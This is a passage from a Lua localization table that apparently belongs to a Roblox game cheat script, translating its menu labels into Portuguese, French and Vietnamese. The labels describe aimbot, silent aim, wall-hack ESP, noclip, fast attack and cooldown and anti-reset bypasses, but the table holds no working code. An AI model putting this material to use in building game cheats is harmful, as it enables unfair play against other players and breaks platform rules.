        ["B2 Skill Key"] = "B2 Tecla",
        ["B2 Weapon"] = "B2 Arma",
        ["B3 Hold Time (s)"] = "B3 Tempo de Retencao (s)",
        ["B3 Mode"] = "B3 Modo",
        ["B3 Post Jumps"] = "B3 Pulos Posteriores",
        ["B3 Skill Key"] = "B3 Tecla",
        ["B3 Weapon"] = "B3 Arma",
        ["B4 Hold Time (s)"] = "B4 Tempo de Retencao (s)",
        ["B4 Mode"] = "B4 Modo",
        ["B4 Post Jumps"] = "B4 Pulos Posteriores",
        ["B4 Skill Key"] = "B4 Tecla",
        ["B4 Weapon"] = "B4 Arma",
        ["B5 Hold Time (s)"] = "B5 Tempo de Retencao (s)",
        ["B5 Mode"] = "B5 Modo",
        ["B5 Post Jumps"] = "B5 Pulos Posteriores",
        ["B5 Skill Key"] = "B5 Tecla",
        ["B5 Weapon"] = "B5 Arma",
        ["B6 Hold Time (s)"] = "B6 Tempo de Retencao (s)",
        ["B6 Mode"] = "B6 Modo",
        ["B6 Post Jumps"] = "B6 Pulos Posteriores",
        ["B6 Skill Key"] = "B6 Tecla",
        ["B6 Weapon"] = "B6 Arma",
        ["Block 1 Enabled"] = "Bloco 1 Ativado",
        ["Block 2 Enabled"] = "Bloco 2 Ativado",
        ["Block 3 Enabled"] = "Bloco 3 Ativado",
        ["Block 4 Enabled"] = "Bloco 4 Ativado",
        ["Block 5 Enabled"] = "Bloco 5 Ativado",
        ["Block 6 Enabled"] = "Bloco 6 Ativado",
        ["Combo Sequence (6 Blocks)"] = "Sequencia de Combo (6 Blocos)",
        ["Display real-time FPS and ping overlay top-left"] = "Exibe overlay de FPS e ping em tempo real",
        ["Displays on-screen one-touch button to trigger combo"] = "Exibe botao na tela para ativar combo",
        ["Do not target allied players"] = "Nao mirar em jogadores aliados",
        ["Do not target players inside safe zones"] = "Nao mirar em jogadores dentro da zona segura",
        ["Do not target players with PvP disabled"] = "Nao mirar em jogadores com PvP desativado",
        ["Enable step 1 in combo"] = "Ativar passo 1 no combo",
        ["Enable step 2 in combo"] = "Ativar passo 2 no combo",
        ["Enable step 3 in combo"] = "Ativar passo 3 no combo",
        ["Enable step 4 in combo"] = "Ativar passo 4 no combo",
        ["Enable step 5 in combo"] = "Ativar passo 5 no combo",
        ["Enable step 6 in combo"] = "Ativar passo 6 no combo",
        ["Enables keyboard trigger and loop execution"] = "Ativa gatilho por teclado e execucao em loop",
        ["Fly"] = "Voar",
        ["Fly Speed"] = "Velocidade de Voo",
        ["Glide freely through the air"] = "Planeje livremente pelo ar",
        ["Ignore Allies"] = "Ignorar Aliados",
        ["Ignore PvP Off"] = "Ignorar PvP Desativado",
        ["Ignore Safe Zone"] = "Ignorar Zona Segura",
        ["Loop Sequence"] = "Sequencia em Loop",
        ["Macro"] = "Macro",
        ["Macro Controller"] = "Controlador de Macro",
        ["Macro Enabled"] = "Macro Ativado",
        ["Macro Floating Widget"] = "Widget Flutuante de Macro",
        ["Macro Slot"] = "Slot de Macro",
        ["Repeat sequence continuously until stopped"] = "Repete a sequencia continuamente ate parar",
        ["Show FPS & Ping"] = "Mostrar FPS e Ping",
        ["Start Combo Sequence"] = "Iniciar Sequencia de Combo",
        ["Stop Combo Sequence"] = "Parar Sequencia de Combo",
        ["Trigger Key (PC)"] = "Tecla de Ativacao (PC)",
    },
    ["French"] = {
        ["180"] = "180",
        ["2D Boxes"] = "Boites 2D",
        ["2D Line"] = "Ligne 2D",
        ["360"] = "360",
        ["3D Beam"] = "Faisceau 3D",
        ["Accent Color & Theme Studio"] = "Studio de Themes et Couleurs",
        ["Account & Player Statistics"] = "Statistiques du Joueur",
        ["Aesthetic Studio Presets"] = "Prereglages d Ambiance",
        ["Aim Mode"] = "Mode de Visee",
        ["Aimbot"] = "Aimbot",
        ["Allows continuous mid-air jumping without cooldown"] = "Permet de sauter en l air continuellement sans rechargement",
        ["Anti-Lava Damage"] = "Anti-Degats de Lave",
        ["Anti-Lava Immunity"] = "Immunite a la Lave",
        ["Apply Fast FFlags"] = "Appliquer Optimisation FFlags",
        ["Apply Wallpaper"] = "Appliquer le Fond",
        ["Atmosphere Wallpaper"] = "Fond d ecran Atmospherique",
        ["Atmosphere Wallpaper Presets (24 Styles)"] = "Fonds Atmospheriques (24 Styles)",
        ["Auto Buso Haki"] = "Auto Haki de l'Armement",
        ["Auto Combat"] = "Combat Automatique",
        ["Auto Race V3"] = "Auto Race V3",
        ["Auto Race V4"] = "Auto Race V4",
        ["Auto Skill Combo"] = "Auto Combo de Competences",
        ["Auto Skill on Soru"] = "Competence Auto au Soru",
        ["Automatically activates Buso Armament Haki (No Ken)"] = "Active automatiquement le Haki de l armement (sans Ken)",
        ["Automatically casts Race V3 ability in combat"] = "Lance automatiquement la competence Race V3 en combat",
        ["Automatically triggers Race Awakening V4 when gauge is filled"] = "Active l eveil Race V4 lorsque la jauge est pleine",
        ["B"] = "B",
        ["BELI"] = "BELI",
        ["BOUNTY"] = "PRIME",
        ["Background Dimming (%)"] = "Assombrissement Fond (%)",
        ["Balanced (65%)"] = "Equilibre (65%)",
        ["Blue"] = "Bleu",
        ["Both"] = "Les deux",
        ["Bottom"] = "Bas",
        ["Bypasses walkspeed reset with direct physical impulse"] = "Contourne la reinitialisation de vitesse par impulsion physique directe",
        ["C"] = "C",
        ["Calculates lead vector based on enemy velocity and ping"] = "Calcule l'anticipation selon vitesse et ping",
        ["Camera FOV"] = "FOV Camera",
        ["Camlock"] = "Verrouillage Camera",
        ["Camlock (Combat Camera)"] = "Camlock (Camera de Combat)",
        ["Camlock Floating Widget"] = "Widget Flottant Camlock",
        ["Camlock Keybind"] = "Touche Camlock",
        ["Caps client to 22 FPS during Sanguine Z cooldown for physics boost"] = "Limite a 22 FPS pendant le cooldown de Sanguine Z pour boost",
        ["Cast Race V3 when in combat"] = "Active Race V3 en plein combat",
        ["Cast Race V4 when gauge is full"] = "Active Race V4 quand la jauge est pleine",
        ["Center"] = "Centre",
        ["Chams & Tracers"] = "Chams et Traceurs",
        ["Chams Highlight Color"] = "Couleur des Chams",
        ["Clear / Dark Glass"] = "Effacer / Verre Fume",
        ["Combat Passives & Auto Skills"] = "Passifs de Combat et Auto Competences",
        ["Combat PvP Status"] = "Statut de Combat PvP",
        ["Combat Targeting & Silent Aim"] = "Visee de Combat et Silent Aim",
        ["Combat Tech"] = "Techniques de Combat",
        ["Combo Key"] = "Touche de Combo",
        ["Combo Weapon"] = "Arme de Combo",
        ["Community"] = "Communaute",
        ["Compact (80%)"] = "Compact (80%)",
        ["Config"] = "Configuration",
        ["Configuration Profiles"] = "Profils de Configuration",
        ["Configuration Reset"] = "Reinitialisation de la Configuration",
        ["Copy Discord Invite Link"] = "Copier le Lien Discord",
        ["Copy Server JobId"] = "Copier le JobId Serveur",
        ["Credits"] = "Credits",
        ["Crystal (80%)"] = "Cristal (80%)",
        ["Custom Dash Length"] = "Portee du Dash",
        ["Custom WalkSpeed"] = "Vitesse Personnalisee",
        ["Custom Wallpaper"] = "Fond Personnalise",
        ["Custom Wallpaper Studio"] = "Studio de Fond Personnalise",
        ["Cyan"] = "Cyan",
        ["Dash Distance"] = "Distance du Dash",
        ["Destroys environmental lava kill zones and damage parts"] = "Detruit les zones de degats et de lave de l environnement",
        ["Detects safe zone and in-combat status indicators"] = "Detecte la zone de securite et le statut de combat",
        ["Developer & Content Creator"] = "Developpeur et Createur",
        ["Development Team & Content Creators"] = "Equipe de Developpement et Createurs",
        ["Devil Fruit Tracker"] = "Traqueur de Fruits",
        ["Direct Wallpaper"] = "Fond Direct",
        ["Disable All Visuals"] = "Desactiver Tous les Visuels",
        ["Display aim boundary circle"] = "Affiche le cercle limite de visee",
        ["Displays formatted usernames above character heads"] = "Affiche le nom au-dessus du joueur",
        ["Displays live gradient health bars and HP percentage"] = "Affiche barres de vie et pourcentage de PV",
        ["Displays movable on-screen JUMP button for touch"] = "Affiche un bouton de SAUT mobile a l ecran pour le tactile",
        ["Displays movable on-screen action button for Sanguine Z"] = "Affiche un bouton d action flottant pour Sanguine Z",
        ["Displays movable on-screen button to toggle camera lock"] = "Affiche un bouton mobile a l ecran pour verrouiller la camera",
        ["Displays movable on-screen toggle for Dragon Gun M1"] = "Affiche un commutateur mobile a l ecran pour Dragon Gun M1",
        ["Displays movable on-screen toggle for camera lock"] = "Affiche un bouton flottant pour verrouiller la camera",
        ["Displays player bounty or honor value in millions"] = "Affiche la prime ou l'honneur en millions",
        ["Displays targeting circle boundary on screen"] = "Affiche le cercle de visee a l ecran",
        ["Distance Indicator"] = "Indicateur de Distance",
        ["Dragon Gun M1"] = "Dragon Gun M1",
        ["Dragon Gun M1 Floating Widget"] = "Widget Flottant Dragon Gun M1",
        ["Draws dynamic bounding boxes around enemy players"] = "Dessine des boites dynamiques autour des ennemis",
        ["Draws line from bottom of screen to tracked players"] = "Trace une ligne depuis le bas vers les joueurs",
        ["E"] = "E",
        ["ESP Style"] = "Style d'ESP",
        ["ESP Text Font Size"] = "Taille Police ESP",
        ["ESP Visuals"] = "Visuels ESP",
        ["Enable All Visuals"] = "Activer Tous les Visuels",
        ["Enable Target Prediction"] = "Activer la Prediction de Cible",
        ["Enable player visual highlights"] = "Active la surbrillance des joueurs",
        ["Enables custom movement speed multiplier"] = "Active le multiplicateur de vitesse personnalisee",
        ["Enables high-performance player visual tracking"] = "Active le suivi visuel des joueurs a haute performance",
        ["English"] = "Anglais",
        ["Equipped Tool / Weapon"] = "Arme Equipee",
        ["Equips weapon and casts chosen skill upon Soru animation"] = "Equipe l arme et lance la competence choisie pendant Soru",
        ["Esp"] = "Visuels",
        ["Executes rapid melee, sword, and fruit attack bursts"] = "Execute des rafales rapides pour melee, epees et fruits",
        ["Executes rapid primary attacks on all nearby enemies"] = "Execute des attaques principales rapides sur tous les ennemis proches",
        ["F"] = "F",
        ["FACTION"] = "FACTION",
        ["FOV"] = "FOV",
        ["FOV Color"] = "Couleur du FOV",
        ["FOV Position"] = "Position du FOV",
        ["FOV Radius"] = "Rayon du FOV",
        ["FOV Thickness"] = "Epaisseur du FOV",
        ["FPS"] = "IPS",
        ["FRUIT"] = "FRUIT",
        ["Fast Attack"] = "Attaque Rapide",
        ["Fast Attack (Melee, Sword, Fruit)"] = "Attaque Rapide (Melee, Epee, Fruit)",
        ["Fast Flags"] = "Optimisation Rapide",
        ["FFlags 1 (FPS Booster)"] = "FFlags 1 (Booster FPS)",
        ["120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris"] = "Limite de 120 FPS, textures plastiques, supprime le brouillard et cache les debris",
        ["No Animations"] = "Sans Animations",
        ["Stops non-attack animations to fix sideways bug and character freezes"] = "Arrete les animations hors attaque pour corriger les blocages",
        ["Fast Flags & Engine Tuning"] = "Fast Flags et Optimisation Moteur",
        ["Field of View"] = "Champ de Vision",
        ["Field of View (FOV Customization)"] = "Champ de Vision (FOV)",
        ["Forward velocity boost"] = "Boost de vitesse vers l'avant",
        ["French"] = "Francais",
        ["Fruit"] = "Fruit",
        ["Game Stats"] = "Statistiques de Jeu",
        ["Glass Interface & Visual Effects"] = "Interface de Verre et Effets",
        ["Glass Transparency"] = "Transparence du Verre",
        ["Green"] = "Vert",
        ["Gun"] = "Arme a feu",
        ["Gun Aura (Dragon Gun M1)"] = "Aura d Arme (Dragon Gun M1)",
        ["Head"] = "Tete",
        ["High jump leap"] = "Saut a haute elevation",
        ["High-distance forward velocity boost with keybind Z"] = "Boost de vitesse frontale longue distance avec touche Z",
        ["Home"] = "Accueil",
        ["HumanoidRootPart"] = "HumanoidRootPart",
        ["Identifies equipped Devil Fruit power (Kitsune, Portal, etc.)"] = "Identifie le fruit demoniaque equipe",
        ["Illuminates full player character models through walls"] = "Illumine les modeles de joueurs a travers les murs",
        ["Immunity to lava damage"] = "Immunite aux degats de lave",
        ["In-Game Attributes"] = "Attributs en Jeu",
        ["Increase dash distance"] = "Augmente la portee du dash",
        ["Infinite Jump"] = "Saut Infini",
        ["Infinite Soru"] = "Soru Infini",
        ["Interface Effects"] = "Effets Visuels",
        ["Interface Language"] = "Langue de l'Interface",
        ["Interface Scale"] = "Echelle de l'Interface",
        ["Jump continuously in mid-air"] = "Sautez en l'air sans limite",
        ["Keep Armament Haki active"] = "Maintient le Haki de l'Armement actif",
        ["LEVEL"] = "NIVEAU",
        ["Language"] = "Langue",
        ["Language & Localization"] = "Langue et Localisation",
        ["Large (120%)"] = "Grand (120%)",
        ["Load Configuration Profile"] = "Charger la Configuration",
        ["Load Config"] = "Charger Configuration",
        ["Lock camera onto enemy"] = "Verrouille la camera sur l'ennemi",
        ["Locks camera perspective directly onto focused enemy player"] = "Verrouille la camera directement sur le joueur ennemi cible",
        ["Looking At Me"] = "Me regarde",
        ["Low HP"] = "Points de vie bas",
        ["Master ESP"] = "ESP Principal",
        ["Master ESP Toggle"] = "Interrupteur Maitre ESP",
        ["Master Visuals & Chams"] = "Visuels Maitres et Chams",
        ["Max Range"] = "Portee Maximale",
        ["Max Soru Range"] = "Portee Maximale du Soru",
        ["Melee"] = "Corps a corps",
        ["Misc"] = "Divers",
        ["Mouse"] = "Souris",
        ["Move smoothly through structures and physical obstacles"] = "Permet de traverser les structures et obstacles",
        ["Movement"] = "Mouvement",
        ["Movement & Agility (PvP Physics)"] = "Mouvement et Agilite (Physique PvP)",
        ["Multiplies dash distance for high-speed repositioning"] = "Multiplie la distance de dash pour un repositionnement rapide",
        ["Multiplies jump impulse for vertical escape and aerial combat"] = "Multiplie l impulsion de saut pour fuite verticale et combat",
        ["NPC Silent Aim"] = "Silent Aim sur PNJs",
        ["Nearest"] = "Le plus proche",
        ["Nearest Player"] = "Joueur le plus proche",
        ["Neon Rain Layer"] = "Pluie Cyber Neon",
        ["Next (›)"] = "Suivant (›)",
        ["Noclip Wallpass"] = "Noclip Passe-Muraille",
        ["None"] = "Aucun",
        ["Official Community & Discord"] = "Communaute Officielle et Discord",
        ["Orange"] = "Orange",
        ["Overhead Billboard"] = "Bandeau Superieur",
        ["PING"] = "LATENCE",
        ["PLAYERS"] = "JOUEURS",
        ["Pass through walls and objects"] = "Traverse les murs et les objets",
        ["Performance"] = "Performance",
        ["Performance & Network"] = "Performances et Reseau",
        ["Pink"] = "Rose",
        ["Player"] = "Joueur",
        ["Player 2D Boxes"] = "Boites 2D Joueurs",
        ["Player Bounty Tracker"] = "Prime du Joueur",
        ["Player Chams & Tracers"] = "Chams et Traceurs",
        ["Player Chams (Highlight)"] = "Chams Joueur (Surbrillance)",
        ["Player Health Status"] = "Sante des Joueurs",
        ["Player Level Display"] = "Niveau du Joueur",
        ["Player Names"] = "Noms des Joueurs",
        ["Player Profile"] = "Profil du Joueur",
        ["Player Profile & Account"] = "Profil Joueur et Compte",
        ["Player Radar Elements"] = "Elements du Radar Joueur",
        ["Player Silent Aim"] = "Silent Aim sur Joueurs",
        ["Player Tracer Color"] = "Couleur Ligne Joueur",
        ["Player Tracers"] = "Traceurs vers Joueurs",
        ["Portuguese"] = "Portugais",
        ["Prediction Amount"] = "Quantite de Prediction",
        ["Premium User  •  Active Session"] = "Utilisateur Premium  •  Session Active",
        ["Preset: Crimson Slayer"] = "Style: Tueur Cramoisi",
        ["Preset: Cyberpunk Violet"] = "Style: Violet Cyberpunk",
        ["Preset: Emerald Forest"] = "Style: Foret Emeraude",
        ["Preset: Shorekeeper Cyan"] = "Style: Shorekeeper Cyan",
        ["Previous (‹)"] = "Precedent (‹)",
        ["Purple"] = "Violet",
        ["PvP"] = "PvP",
        ["PvP Tech, Camlock & Universal Keybinds"] = "Technologie PvP, Camlock et Raccourcis",
        ["Q"] = "Q",
        ["Quick Actions"] = "Actions Rapides",
        ["R"] = "R",
        ["RACE"] = "RACE",
        ["Radar Elements"] = "Elements du Radar",
        ["Rainbow"] = "Arc-en-ciel",
        ["Rainbow Chroma Speed"] = "Vitesse Chroma Arc-en-ciel",
        ["Raindrop Density"] = "Densite des Gouttes",
        ["Random (Shuffle)"] = "Aleatoire",
        ["Rapid fire M1 gun shots"] = "Tirs M1 ultra rapides",
        ["Rapid melee and weapon strikes"] = "Frappes rapides au corps a corps",
        ["Rapid weapon hit bursts"] = "Attaques continues a l'arme",
        ["Rapid-fire gun attack loop targeting nearest combatant"] = "Attaque rapide a l arme a feu sur la cible la plus proche",
        ["Red"] = "Rouge",
        ["Redirect skills toward enemy players"] = "Redirige les competences vers les joueurs",
        ["Redirect skills toward mobs and bosses"] = "Redirige les competences vers les monstres et boss",
        ["Redirects Flashstep teleport directly to enemy player"] = "Redirige la teleportation directement vers le joueur ennemi",
        ["Redirects skills and attacks towards enemy players"] = "Redirige les competences et attaques vers les joueurs ennemis",
        ["Redirects skills and attacks towards mobs and bosses"] = "Redirige les competences et attaques vers les monstres et boss",
        ["Rejoin Current Server"] = "Rejoindre le Serveur",
        ["Remove flashstep cooldown"] = "Supprime le temps de recharge du pas eclair",
        ["Removes cooldown delay and bypasses stamina limits"] = "Supprime le temps de recharge et limites d endurance",
        ["Renders hardware 3D Beams and 2D lines to target"] = "Genere des faisceaux 3D et lignes 2D vers la cible",
        ["Reset All Settings to Factory Defaults"] = "Reinitialiser aux Valeurs Usine",
        ["Reset Configuration Profile"] = "Reinitialiser la Configuration",
        ["Reset Config"] = "Reinitialiser Configuration",
        ["Configuration profile reset to defaults."] = "Profil de configuration reinitialise par defaut.",
        ["Reset Theme to Purple"] = "Reinitialiser le Theme en Violet",
        ["Sanguine Boost"] = "Boost Sanguin",
        ["Sanguine Boost Floating Widget"] = "Widget Flottant Sanguine Z",
        ["Sanguine Keybind"] = "Touche Sanguine",
        ["Save Configuration Profile"] = "Sauvegarder la Configuration",
        ["Save Config"] = "Sauvegarder Configuration",
        ["Selected Player"] = "Joueur selectionne",
        ["Server Hop (Fast)"] = "Changer de Serveur (Rapide)",
        ["Show FOV Circle"] = "Afficher Cercle FOV",
        ["Show Tracers"] = "Afficher Lignes de Traceurs",
        ["Shows distance measurement in studs below player feet"] = "Affiche la distance en studs sous les pieds",
        ["Shows player rank and numerical level tag"] = "Affiche le rang et le niveau numerique du joueur",
        ["Shows weapon, sword, fruit or gun held by the player"] = "Affiche l'arme, epee, fruit ou pistolet tenu",
        ["Silent Aim"] = "Visee Silencieuse",
        ["Skill Blacklist"] = "Liste Noire de Competences",
        ["Skill Delay"] = "Delai de Competence",
        ["Skill Redirection Blacklist"] = "Liste Noire de Competences",
        ["Soru"] = "Soru",
        ["Soru Aimbot"] = "Soru Aimbot",
        ["Soru Combat Aimbot"] = "Aimbot Soru",
        ["Soru Flashstep Engine"] = "Moteur Soru Flashstep",
        ["Soru Skill Combo"] = "Combo de Competences Soru",
        ["Soru Skill Combo Automation"] = "Auto Combo de Competences Soru",
        ["Soru Target Mode"] = "Mode Cible Soru",
        ["Spanish"] = "Espagnol",
        ["Spawns water surface collider allowing sprint across oceans"] = "Cree une plateforme aquatique pour courir sur les oceans",
        ["Speed up player movement"] = "Augmente la vitesse du joueur",
        ["Standard (100%)"] = "Standard (100%)",
        ["Subtle (50%)"] = "Subtil (50%)",
        ["Super Jump"] = "Super Saut",
        ["Super Jump Floating Widget"] = "Widget Flottant de Super Saut",
        ["Super Jump Force"] = "Force du Super Saut",
        ["Sword"] = "Epee",
        ["System Info"] = "Infos Systeme",
        ["T"] = "T",
        ["Target Hitbox"] = "Zone d'Impact",
        ["Target Player Selection"] = "Selection du Joueur Cible",
        ["Target Priority"] = "Priorite de Cible",
        ["Target Selection & Aim Mode"] = "Selection de Cible et Mode",
        ["Target Tracers"] = "Traceurs de Cible",
        ["Teleport soru directly to enemy"] = "Teleporte en soru directement vers l'ennemi",
        ["Theme Presets"] = "Styles Predefinis",
        ["Theme Reset"] = "Reinitialiser le Theme",
        ["Themes"] = "Themes",
        ["Toggle Rainbow Chroma Mode"] = "Mode Chroma Arc-en-ciel",
        ["Toggle animated falling cyber rain streaks"] = "Active la pluie cyber animee",
        ["Tracer Color"] = "Couleur de Ligne",
        ["Tracer Mode"] = "Mode de Ligne",
        ["Tracer Origin"] = "Origine de Ligne",
        ["Tracer Thickness"] = "Epaisseur de Ligne",
        ["Tracers"] = "Lignes de Traceurs",
        ["Trigger Super Jump"] = "Declencher Super Saut",
        ["Typography Font"] = "Police Typographique",
        ["Typography Studio"] = "Studio de Typographie",
        ["UPTIME"] = "DUREE",
        ["Ultra fast burst firing with CombatController validator"] = "Tir en rafale ultra rapide avec validateur CombatController",
        ["UpperTorso"] = "Torse Superieur",
        ["Use skill instantly after Soru"] = "Lance une competence immediatement apres le Soru",
        ["V"] = "V",
        ["Vietnamese"] = "Vietnamien",
        ["Visuals"] = "Visuels",
        ["Vitality & Energy Status"] = "Etat de Sante et Energie",
        ["Walk on Water"] = "Marcher sur l'Eau",
        ["Walk on ocean surface"] = "Marcher sur la surface de l'ocean",
        ["WalkSpeed Value"] = "Valeur de Vitesse",
        ["Wallpaper"] = "Fond d'ecran",
        ["Wallpapers"] = "Fonds d'ecran",
        ["White"] = "Blanc",
        ["World & Client Optimization"] = "Optimisation Monde et Client",
        ["X"] = "X",
        ["Yellow"] = "Jaune",
        ["Z"] = "Z",
        ["Z Sanguine Boost"] = "Boost Sanguine Z",
        ["B1 Hold Time (s)"] = "B1 Temps de Maintien (s)",
        ["B1 Mode"] = "B1 Mode",
        ["B1 Post Jumps"] = "B1 Sauts Posterieurs",
        ["B1 Skill Key"] = "B1 Touche",
        ["B1 Weapon"] = "B1 Arme",
        ["B2 Hold Time (s)"] = "B2 Temps de Maintien (s)",
        ["B2 Mode"] = "B2 Mode",
        ["B2 Post Jumps"] = "B2 Sauts Posterieurs",
        ["B2 Skill Key"] = "B2 Touche",
        ["B2 Weapon"] = "B2 Arme",
        ["B3 Hold Time (s)"] = "B3 Temps de Maintien (s)",
        ["B3 Mode"] = "B3 Mode",
        ["B3 Post Jumps"] = "B3 Sauts Posterieurs",
        ["B3 Skill Key"] = "B3 Touche",
        ["B3 Weapon"] = "B3 Arme",
        ["B4 Hold Time (s)"] = "B4 Temps de Maintien (s)",
        ["B4 Mode"] = "B4 Mode",
        ["B4 Post Jumps"] = "B4 Sauts Posterieurs",
        ["B4 Skill Key"] = "B4 Touche",
        ["B4 Weapon"] = "B4 Arme",
        ["B5 Hold Time (s)"] = "B5 Temps de Maintien (s)",
        ["B5 Mode"] = "B5 Mode",
        ["B5 Post Jumps"] = "B5 Sauts Posterieurs",
        ["B5 Skill Key"] = "B5 Touche",
        ["B5 Weapon"] = "B5 Arme",
        ["B6 Hold Time (s)"] = "B6 Temps de Maintien (s)",
        ["B6 Mode"] = "B6 Mode",
        ["B6 Post Jumps"] = "B6 Sauts Posterieurs",
        ["B6 Skill Key"] = "B6 Touche",
        ["B6 Weapon"] = "B6 Arme",
        ["Block 1 Enabled"] = "Bloc 1 Active",
        ["Block 2 Enabled"] = "Bloc 2 Active",
        ["Block 3 Enabled"] = "Bloc 3 Active",
        ["Block 4 Enabled"] = "Bloc 4 Active",
        ["Block 5 Enabled"] = "Bloc 5 Active",
        ["Block 6 Enabled"] = "Bloc 6 Active",
        ["Combo Sequence (6 Blocks)"] = "Sequence de Combo (6 Blocs)",
        ["Display real-time FPS and ping overlay top-left"] = "Affiche l'overlay FPS et ping en temps reel",
        ["Displays on-screen one-touch button to trigger combo"] = "Affiche un bouton a l'ecran pour lancer le combo",
        ["Do not target allied players"] = "Ne pas cibler les allies",
        ["Do not target players inside safe zones"] = "Ne pas cibler les joueurs en zone sure",
        ["Do not target players with PvP disabled"] = "Ne pas cibler les joueurs sans PvP",
        ["Enable step 1 in combo"] = "Activer l'etape 1 du combo",
        ["Enable step 2 in combo"] = "Activer l'etape 2 du combo",
        ["Enable step 3 in combo"] = "Activer l'etape 3 du combo",
        ["Enable step 4 in combo"] = "Activer l'etape 4 du combo",
        ["Enable step 5 in combo"] = "Activer l'etape 5 du combo",
        ["Enable step 6 in combo"] = "Activer l'etape 6 du combo",
        ["Enables keyboard trigger and loop execution"] = "Active le declencheur clavier et l'execution en boucle",
        ["Fly"] = "Voler",
        ["Fly Speed"] = "Vitesse de Vol",
        ["Glide freely through the air"] = "Glissez librement dans les airs",
        ["Ignore Allies"] = "Ignorer les Allies",
        ["Ignore PvP Off"] = "Ignorer PvP Desactive",
        ["Ignore Safe Zone"] = "Ignorer Zone Sure",
        ["Loop Sequence"] = "Sequence en Boucle",
        ["Macro"] = "Macro",
        ["Macro Controller"] = "Controleur de Macro",
        ["Macro Enabled"] = "Macro Active",
        ["Macro Floating Widget"] = "Widget Flottant de Macro",
        ["Macro Slot"] = "Emplacement Macro",
        ["Repeat sequence continuously until stopped"] = "Repete la sequence en boucle jusqu'a l'arret",
        ["Show FPS & Ping"] = "Afficher FPS et Ping",
        ["Start Combo Sequence"] = "Demarrer Sequence de Combo",
        ["Stop Combo Sequence"] = "Arreter Sequence de Combo",
        ["Trigger Key (PC)"] = "Touche d'Activation (PC)",
    },
    ["Vietnamese"] = {
        ["180"] = "180",
        ["2D Boxes"] = "Khung 2D",
        ["2D Line"] = "Duong 2D",
        ["360"] = "360",
        ["3D Beam"] = "Tia 3D",
        ["Accent Color & Theme Studio"] = "Tuy chinh mau sac va Chu de",
        ["Account & Player Statistics"] = "Thong ke Nguoi choi",
        ["Aesthetic Studio Presets"] = "Mau giao dien co san",
        ["Aim Mode"] = "Che do ngam",
        ["Aimbot"] = "Aimbot",
        ["Allows continuous mid-air jumping without cooldown"] = "Cho phep nhay lien tuc tren khong khong hoi chieu",
        ["Anti-Lava Damage"] = "Chong sat thuong dung nham",
        ["Anti-Lava Immunity"] = "Mien nhiem dung nham",
        ["Apply Fast FFlags"] = "Ap dung toi uu FFlags",
        ["Apply Wallpaper"] = "Ap dung hinh nen",
        ["Atmosphere Wallpaper"] = "Hinh nen Khong gian",
        ["Atmosphere Wallpaper Presets (24 Styles)"] = "Hinh nen khong gian (24 Kieu)",
        ["Auto Buso Haki"] = "Tu dong bat Haki Vu Trang",
        ["Auto Combat"] = "Chien dau tu dong",
        ["Auto Race V3"] = "Tu dong bat Toc V3",
        ["Auto Race V4"] = "Tu dong bat Toc V4",
        ["Auto Skill Combo"] = "Tu dong Combo ky nang",
        ["Auto Skill on Soru"] = "Tu dong dung chieu khi Soru",
        ["Automatically activates Buso Armament Haki (No Ken)"] = "Tu dong bat Buso Haki vu trang (khong bat Ken)",
        ["Automatically casts Race V3 ability in combat"] = "Tu dong dung ky nang Toc V3 trong chien dau",
        ["Automatically triggers Race Awakening V4 when gauge is filled"] = "Tu dong thuc tinh Toc V4 khi thanh nang luong day",
        ["B"] = "B",
        ["BELI"] = "TIEN BELI",
        ["BOUNTY"] = "TIEN THUONG",
        ["Background Dimming (%)"] = "Do toi nen (%)",
        ["Balanced (65%)"] = "Can bang (65%)",
        ["Blue"] = "Xanh duong",
        ["Both"] = "Ca hai",
        ["Bottom"] = "Duoi cung",
        ["Bypasses walkspeed reset with direct physical impulse"] = "Bo qua dat lai toc do chay bang xung luc vat ly truc tiep",
        ["C"] = "C",
        ["Calculates lead vector based on enemy velocity and ping"] = "Tinh toan huong don dua tren toc do va ping",
        ["Camera FOV"] = "FOV goc nhin",
        ["Camlock"] = "Khoa goc nhin",
        ["Camlock (Combat Camera)"] = "Camlock (Camera chien dau)",
        ["Camlock Floating Widget"] = "Nut noi Camlock",
        ["Camlock Keybind"] = "Phim tat Camlock",
        ["Caps client to 22 FPS during Sanguine Z cooldown for physics boost"] = "Gioi han 22 FPS trong hoi chieu Sanguine Z de day vat ly",
        ["Cast Race V3 when in combat"] = "Kich hoat Toc V3 khi giao tranh",
        ["Cast Race V4 when gauge is full"] = "Kich hoat Toc V4 khi day thanh no",
        ["Center"] = "Trung tam",
        ["Chams & Tracers"] = "Chams va Dan huong",
        ["Chams Highlight Color"] = "Mau Chams",
        ["Clear / Dark Glass"] = "Xoa / Kinh toi mau",
        ["Combat Passives & Auto Skills"] = "Noi tai chien dau va Tu dong ky nang",
        ["Combat PvP Status"] = "Trang thai giao tranh PvP",
        ["Combat Targeting & Silent Aim"] = "Khoa muc tieu va Silent Aim",
        ["Combat Tech"] = "Ky thuat chien dau",
        ["Combo Key"] = "Phim tat Combo",
        ["Combo Weapon"] = "Vu khi Combo",
        ["Community"] = "Cong dong",
        ["Compact (80%)"] = "Gon gang (80%)",
        ["Config"] = "Cau hinh",
        ["Configuration Profiles"] = "Cau hinh da luu",
        ["Configuration Reset"] = "Dat lai cau hinh",
        ["Copy Discord Invite Link"] = "Sao chep lien ket Discord",
        ["Copy Server JobId"] = "Sao chep JobId may chu",
        ["Credits"] = "Tac gia",
        ["Crystal (80%)"] = "Trong suot (80%)",
        ["Custom Dash Length"] = "Khoang cach luot",
        ["Custom WalkSpeed"] = "Toc do chay tuy chon",
        ["Custom Wallpaper"] = "Hinh nen tuy chon",
        ["Custom Wallpaper Studio"] = "Tuy chinh hinh nen rieng",
        ["Cyan"] = "Xanh lo",
        ["Dash Distance"] = "Khoang cach luot",
        ["Destroys environmental lava kill zones and damage parts"] = "Pha huy cac vung dung nham gay sat thuong trong moi truong",
        ["Detects safe zone and in-combat status indicators"] = "Phat hien khu vuc an toan va trang thai chien dau",
        ["Developer & Content Creator"] = "Nha phat trien va Sang tao noi dung",
        ["Development Team & Content Creators"] = "Doi ngu phat trien va Sang tao",
        ["Devil Fruit Tracker"] = "Dinh vi trai ac quy",
        ["Direct Wallpaper"] = "Hinh nen truc tiep",
        ["Disable All Visuals"] = "Tat tat ca hien thi",
        ["Display aim boundary circle"] = "Hien thi vong tron gioi han tam ngam",
        ["Displays formatted usernames above character heads"] = "Hien thi ten tren dau nhan vat",
        ["Displays live gradient health bars and HP percentage"] = "Hien thi thanh mau va phan tram mau",
